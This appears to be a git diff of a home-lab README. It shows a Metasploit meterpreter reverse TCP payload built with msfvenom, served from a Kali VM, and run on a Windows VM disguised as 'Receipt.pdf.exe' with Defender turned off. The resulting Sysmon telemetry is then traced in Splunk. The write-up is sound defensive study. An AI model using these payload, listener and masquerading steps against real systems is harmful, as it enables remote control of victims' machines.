@@ -49,7 +49,7 @@ The Experimenting with Splunk & Sysmon project is where I will be documenting th
 - I lastly opened the services app to ensure Sysmon was installed and running in the VM:
 <img width="862" height="603" alt="Pasted image 20251021223015" src="https://github.com/user-attachments/assets/51a851e1-d70f-4657-8012-25a58b3fdc7c" />
 
-## Generating Telemetry
+## Setting Up for Malware Test
 - I started by moving the Windows 11 VM back into the internal network and changing the IPv4 address back to **10.1.1.2**
 - I also increased the memory to 7 GB in both the Windows 11 and Kali Linux VMs
 ### Scanning the Windows VM with Nmap
@@ -65,7 +65,8 @@ The Experimenting with Splunk & Sysmon project is where I will be documenting th
 
 - Port 3389 is the RDP port and other notable ports are 8000 and 8089 which are both used by Splunk that was installed earlier in the project
 - Obviously I knew that the RDP port would be open but chose to still use Nmap to simulate performing reconnaissance and ensure the port was open/reachable by the Kali VM
-### Setting Up Malware on the Kali VM
+
+### Building Malware on the Kali VM
 - The malware payload will be created using MSFvenom on the Kali VM
 - After launching a terminal, I used `msfvenom -l payloads` to view a list of possible payloads to be used during the test
 - For this test, I will be using the `windows/x64/meterpreter_reverse_tcp` payload:
@@ -81,4 +82,82 @@ The Experimenting with Splunk & Sysmon project is where I will be documenting th
 - So the malware output will be a meterpreter reverse tcp payload that will communicate back to the Kali VM through port 4444:
 <img width="847" height="156" alt="Pasted image 20251022221551" src="https://github.com/user-attachments/assets/468134ba-98bd-4965-8c10-8a8f182b6846" />
 
-- Current progress, will be updated with the execution of the malware
+- I then used `msfconsole` to open the Metasploit Framework console followed by `use exploit/multi/handler`
+- The multi/handler will act as a listener for receiving the incoming connections from the given payload
+- In order to do that, I had to run the following commands to edit the preset configurations:
+	- `set payload windows/x64/meterpreter_reverse_tcp`
+	- `set lhost 10.1.1.3`
+- Entering `options` into the msfconsole returns the current configuration following these updates:
+<img width="807" height="386" alt="Pasted image 20251023135649" src="https://github.com/user-attachments/assets/6904aa05-12ee-4a01-954b-d985cc7e7d0d" />
+
+- Now I can enter `exploit` and the handler will start listening:
+<img width="402" height="56" alt="Pasted image 20251023135804" src="https://github.com/user-attachments/assets/c2afcb0b-c404-4247-989a-67216a4502e3" />
+
+- The final part of this section is starting a simple http server on the Kali VM to allow the malware to be transferred to the target machine
+- The simplest way this can be done is by opening a new terminal and entering `python3 -m http.server 9999` in the same directory as the malware
+<img width="492" height="83" alt="Pasted image 20251023142846" src="https://github.com/user-attachments/assets/42560bd8-e251-4c78-ba58-573fef4e938b" />
+
+## Downloading the Malware on the Windows VM
+- With Windows Defender already disabled, I just had to go to `http://10.1.1.3:9999` to download the malware:
+<img width="652" height="260" alt="Pasted image 20251023144714" src="https://github.com/user-attachments/assets/3bfcd6ac-110c-4380-8ed4-3660d3400668" />
+
+- I also had to go back into windows security settings and turn off Real-time protection in the Virus & threat protection settings
+- If left on, the downloaded malware would be identified and deleted automatically
+- With that off and the malware downloaded, I can double click the Receipt.pdf.exe file
+- If I were to have the **Show file name extensions** setting turned off, it is easier to see how someone could open this file by mistake (though still unlikely):
+<img width="785" height="221" alt="Pasted image 20251023194113" src="https://github.com/user-attachments/assets/af67722b-083b-40c5-9282-09570d90bac1" />
+
+## Final Splunk Configurations Before Malware Execution
+- Back on the Windows 11 VM, I had to make sure that Splunk was ingesting the Sysmon logs that were being generated
+- To do this I went to `C:\Program Files\Splunk\etc\system\local` and edit the **inputs.conf** file
+- Because said file was not initially in this directory, I had to copy the default **inputs.conf** from the `Splunk\etc\system\default` directory
+- I then added the following to the **inputs.conf** file:
+<img width="552" height="632" alt="Pasted image 20251023184340" src="https://github.com/user-attachments/assets/d39f7673-aaef-4361-b675-82f324a8f70b" />
+
+- I went with adding more than just the Sysmon logs in case I want to experiment further but the goal of this project is seeing the telemetry generated via Sysmon and ingested by Splunk
+- Then in the actual Splunk interface, I have to add the new index to be able to view the new data
+- This was done by simply going to `Settings > Indexes > New Index` and creating the **endpoint** index:
+<img width="793" height="807" alt="Pasted image 20251023190856" src="https://github.com/user-attachments/assets/0b67284f-4fb6-44b8-947e-8919800c1a41" />
+
+- Finally, I went to the Find More Apps section of Splunk to install the **Splunk Add-on for Sysmon** app which improves Splunk's ability to parse the Sysmon telemetry
+- I did have to be connected to the internet for this step which meant I needed to quickly swap the network adapter to NAT and then back to Internal Network after I was done
+
+## Executing the Malware
+- It will still be detected as a possible malicious program but for this experiment, I am going to run it anyways
+- After running, I opened PowerShell as administrator and entered `netstat -anob | Select-String "10.1.1.3" -Context 0,1`:
+<img width="637" height="150" alt="Pasted image 20251023193802" src="https://github.com/user-attachments/assets/bc56d0c2-da3c-44ad-a4d8-9422b2553a7d" />
+
+- The four netstat flags are as follows:
+	- **a** = Display all connections and listening ports
+	- **n** = Display time spent by a TCP connection
+	- **o** = Display the owning process ID associated with each connection
+	- **b** = Display the executable involved in creating each connection or listening port
+- I then piped the output into the **Select-String** command to search for **"10.1.1.3"** and used **-Context 0,1** to include the next line which contained the executable that created the connection
+- This shows that there is an active TCP connection from the Windows VM to the Kali VM through port 4444 that was opened by Receipt.pdf.exe
+- The process ID shown in the screenshot above is 11764 which can be further verified in the details section of task manager:
+<img width="761" height="265" alt="Pasted image 20251023193839" src="https://github.com/user-attachments/assets/46f65df6-4b3a-4ab2-8331-b55acf7d41fd" />
+
+- Now back on the Kali VM, a meterpreter connection was made and can now be used to open a shell
+<img width="842" height="272" alt="Pasted image 20251023193909" src="https://github.com/user-attachments/assets/82bab0dc-e4ed-4afd-9437-767b050897e9" />
+
+- I then ran `whoami`, `net user`, `net localgroup`, and `ipconfig` to generate telemetry back on the Windows VM
+## Viewing the Telemetry
+- Back in Splunk, I can go into the Search & Reporting tab and search for **index="endpoint"** and filter the search in various was in order to view the information fed in by Sysmon
+- For example, I can search for **index="endpoint" 10.1.1.3** to filter for traffic that relates to the Kali Linux VM
+- I can then look at the **Interesting Fields** section on the left of the screen and see things like *dest_port* which shows the outgoing traffic to port 4444 which is the meterpreter port used by the malware:
+<img width="558" height="281" alt="Pasted image 20251023202244" src="https://github.com/user-attachments/assets/5d93722f-69f6-4f74-b599-010087b0b11c" />
+
+- Another example is to add the name of the malware to the search bar as `index="endpoint" Receipt.pdf.exe`
+- I can then go to the **EventCode** Interesting Field and click on the code with value 1
+<img width="592" height="540" alt="Pasted image 20251023203446" src="https://github.com/user-attachments/assets/fc9fea9e-c648-464d-9738-c116111a77b3" />
+
+- After expanding the first result, I could then view much more information such as the processes and parent processes that were running
+- After scrolling, I found a **cmd.exe** process with the parent process being the malware I downloaded earlier, **Receipt.pdf.exe**
+<img width="786" height="527" alt="Pasted image 20251023204308" src="https://github.com/user-attachments/assets/a17ccf1a-bdbf-4449-ac67-035c6f15cf31" />
+
+- Now a few lines above the bottom red circle, you can see the **process_guid** value listed for the cmd.exe process that I want to investigate further
+- If I take this value and craft a Splunk search as `index="endpoint" {2929efd0-bb1f-68fa-8302-000000000d00} | table _time,ParentImage,Image,CommandLine`, it returns the following table:
+<img width="1303" height="772" alt="Screenshot 2025-10-23 205443" src="https://github.com/user-attachments/assets/0d47713b-cf30-40c5-b4d5-be08c77d6c2d" />
+
+- I ran the commands a few extra times but if you look on the right side, you can see the whoami, net user, net localgroup, and ipconfig commands that were run through the shell and now appear in Splunk
+- This shows that Sysmon captured the commands input via the meterpreter_reverse_tcp payload shell that was created on the Kali VM and Splunk is able to then ingest these logs and display/report them
